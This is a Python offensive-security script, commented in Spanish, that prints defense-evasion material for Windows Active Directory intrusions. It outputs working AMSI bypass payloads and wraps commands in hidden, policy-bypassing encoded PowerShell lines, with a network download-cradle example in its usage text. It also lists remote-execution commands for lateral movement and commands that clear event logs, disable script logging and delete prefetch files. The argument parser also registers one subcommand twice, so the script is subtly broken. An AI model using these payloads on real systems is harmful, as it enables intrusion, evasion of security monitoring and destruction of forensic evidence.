#!/usr/bin/env python3
"""
evasion_toolkit.py — Generador de tecnicas de evasion para AD
MITRE ATT&CK: T1562.001 (AMSI Bypass) · T1070 (Log Clearing)

Uso:
    python3 evasion_toolkit.py amsi          # AMSI bypass payloads
    python3 evasion_toolkit.py obfuscate --cmd "IEX(New-Object Net.WebClient)..."
    python3 evasion_toolkit.py lotl          # Living off the Land commands
    python3 evasion_toolkit.py clear-logs    # Comandos de borrado de logs
"""

import argparse
import base64
import sys


class C:
    RED="\033[91m";GREEN="\033[92m";YELLOW="\033[93m"
    BLUE="\033[94m";CYAN="\033[96m";BOLD="\033[1m";RESET="\033[0m"

def ok(m):   print(C.GREEN+  "  [+] "+C.RESET+m)
def info(m): print(C.BLUE+   "  [*] "+C.RESET+m)
def warn(m): print(C.YELLOW+ "  [!] "+C.RESET+m)
def show(title, cmd): print("\n  " + C.CYAN + title + C.RESET + "\n  " + cmd)


def banner():
    print(C.YELLOW+C.BOLD+"""
  ╔══════════════════════════════════════════════════╗
  ║   EVASION TOOLKIT — AMSI · LOtL · Obfuscation   ║
  ╚══════════════════════════════════════════════════╝
"""+C.RESET)


def cmd_amsi(args):
    """Muestra tecnicas de bypass de AMSI."""
    print(C.BOLD + "\n  ══ AMSI BYPASS PAYLOADS ══\n" + C.RESET)
    print("  AMSI intercepta scripts PowerShell antes de ejecutarlos.")
    print("  Estos payloads lo deshabilitan en memoria:\n")

    payloads = {
        "Metodo 1 — Reflection (clasico)": (
            '[Ref].Assembly.GetType(\'System.Management.Automation.AmsiUtils\') | '
            '?{$_} | %{$_.GetField(\'amsiInitFailed\',\'NonPublic,Static\').SetValue($null,$true)}'
        ),
        "Metodo 2 — Patch de memoria": (
            '$a=[Ref].Assembly.GetType(\'System.Management.Automation.AmsiUtils\');'
            '$b=$a.GetField(\'amsiContext\',\'NonPublic,Static\').GetValue($null);'
            '[IntPtr]$c=[System.Runtime.InteropServices.Marshal]::Alloc(9);'
            '$d=[Byte[]](0x31,0xC0,0xC3,0,0,0,0,0,0);'
            '[System.Runtime.InteropServices.Marshal]::Copy($d,$c,0,9);'
            '$e=[System.Runtime.InteropServices.Marshal]::ReadInt64($b);'
            '$f=[System.Runtime.InteropServices.Marshal]::ReadIntPtr([IntPtr]($e+0x58));'
            '[System.Runtime.InteropServices.Marshal]::WriteIntPtr([IntPtr]($e+0x58),$c)'
        ),
        "Metodo 3 — String split (evasion de firma)": (
            '$w = \'Ams\' + \'iUtils\'; '
            '[Ref].Assembly.GetType(\'System.Management.Automation.\'+$w).GetField(\'amsi\'+'
            '\'InitFailed\',\'NonPublic,Static\').SetValue($null,$true)'
        ),
        "Metodo 4 — Downgrade a PowerShell v2 (sin AMSI)": (
            'powershell.exe -version 2 -exec bypass'
        ),
    }

    for title, payload in payloads.items():
        print("  " + C.YELLOW + title + ":" + C.RESET)
        print("  " + payload[:120] + ("..." if len(payload) > 120 else ""))
        print()

    info("Verificar que AMSI esta deshabilitado:")
    print("  [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').GetValue($null)")
    print("  # Debe devolver: True")


def cmd_obfuscate(args):
    """Ofusca un comando PowerShell en Base64."""
    cmd = args.cmd
    print(C.BOLD + "\n  ══ OBFUSCACION POWERSHELL ══\n" + C.RESET)
    info("Comando original: " + cmd[:80])
    print()

    # Base64 encoding (UTF-16LE que usa PowerShell)
    encoded = base64.b64encode(cmd.encode("utf-16-le")).decode()

    show("Forma 1 — EncodedCommand (estandar):",
         "powershell.exe -EncodedCommand " + encoded)
    show("Forma 2 — Con bypass de execution policy:",
         "powershell.exe -ep bypass -enc " + encoded)
    show("Forma 3 — Oculto sin ventana:",
         'powershell.exe -WindowStyle Hidden -NonInteractive -ep bypass -enc ' + encoded)
    show("Forma 4 — Desde cmd.exe:",
         'cmd.exe /c powershell -ep bypass -enc ' + encoded)

    print()
    info("Verificar decodificacion:")
    print("  [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('" +
          encoded[:30] + "...'))")


def cmd_lotl(args):
    """Living off the Land — comandos de ejecucion remota sin herramientas externas."""
    print(C.BOLD + "\n  ══ LIVING OFF THE LAND (LOtL) ══\n" + C.RESET)
    print("  Usar herramientas legitimas de Windows para evitar deteccion:\n")

    target = args.target or "OBJETIVO"
    cmd    = args.cmd    or "calc.exe"

    lotl_cmds = {
        "WMI — Ejecucion remota":
            'wmic /node:' + target + ' /user:DOMINIO\\usuario /password:pass process call create "' + cmd + '"',
        "WMI — PowerShell":
            'Invoke-WmiMethod -ComputerName ' + target + ' -Class Win32_Process -Name Create -ArgumentList "' + cmd + '"',
        "DCOM — MMC20":
            '$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","' + target + '")); '
            '$com.Document.ActiveView.ExecuteShellCommand("' + cmd + '",$null,"","7")',
        "PSRemoting (WinRM)":
            'Invoke-Command -ComputerName ' + target + ' -ScriptBlock { ' + cmd + ' }',
        "Scheduled Task remota":
            'schtasks /create /s ' + target + ' /u dominio\\usuario /p pass /tn "Task" /tr "' + cmd + '" /sc once /st 00:00',
        "SCM — Servicio remoto":
            'sc \\\\' + target + ' create nombre binpath= "' + cmd + '" && sc \\\\' + target + ' start nombre',
        "WMIC desde Kali (impacket)":
            'impacket-wmiexec dominio/usuario:pass@' + target + ' "' + cmd + '"',
    }

    for title, command in lotl_cmds.items():
        print("  " + C.CYAN + title + ":" + C.RESET)
        print("  " + command[:150])
        print()


def cmd_clear_logs(args):
    """Comandos para borrar logs y minimizar evidencias."""
    print(C.BOLD + "\n  ══ BORRADO DE LOGS ══\n" + C.RESET)
    warn("En una auditoria real: documentar antes de borrar")
    print()

    cmds = {
        "PowerShell — Borrar todos los event logs":
            'Get-EventLog -LogName * | ForEach-Object { Clear-EventLog -LogName $_.Log }',
        "wevtutil — Borrar logs especificos":
            'wevtutil cl System; wevtutil cl Security; wevtutil cl Application',
        "Meterpreter (post-explotacion)":
            'meterpreter> clearev',
        "Desactivar logging de PowerShell (registro)":
            'Set-ItemProperty HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging EnableScriptBlockLogging 0',
        "Borrar prefetch":
            'del /f /q C:\\Windows\\Prefetch\\*',
        "Borrar archivos temporales":
            'del /f /q %TEMP%\\*',
    }

    for title, command in cmds.items():
        print("  " + C.YELLOW + title + ":" + C.RESET)
        print("  " + command)
        print()

    warn("El borrado de logs genera Event ID 1102 (Security log cleared)")
    info("Alternativa mas silenciosa: usar -NoProfile -NonInteractive en PS")


def parse_args():
    p = argparse.ArgumentParser(description="evasion_toolkit.py — Evasion de defensas")
    sub = p.add_subparsers(dest="command", required=True)

    sub.add_parser("amsi",   help="AMSI bypass payloads")
    sub.add_parser("lotl",   help="Living off the Land commands").add_argument("--target", default=None)
    sub.parse_known_args()

    ob = sub.add_parser("obfuscate", help="Ofuscar comando PowerShell en Base64")
    ob.add_argument("--cmd", required=True)

    lo = sub.add_parser("lotl", help="Living off the Land")
    lo.add_argument("--target", default="OBJETIVO")
    lo.add_argument("--cmd",    default="calc.exe")

    sub.add_parser("clear-logs", help="Comandos de borrado de logs")

    return p.parse_args()


def main():
    banner()
    args = parse_args()
    if args.command == "amsi":        cmd_amsi(args)
    elif args.command == "obfuscate": cmd_obfuscate(args)
    elif args.command == "lotl":      cmd_lotl(args)
    elif args.command == "clear-logs":cmd_clear_logs(args)

if __name__ == "__main__":
    main()
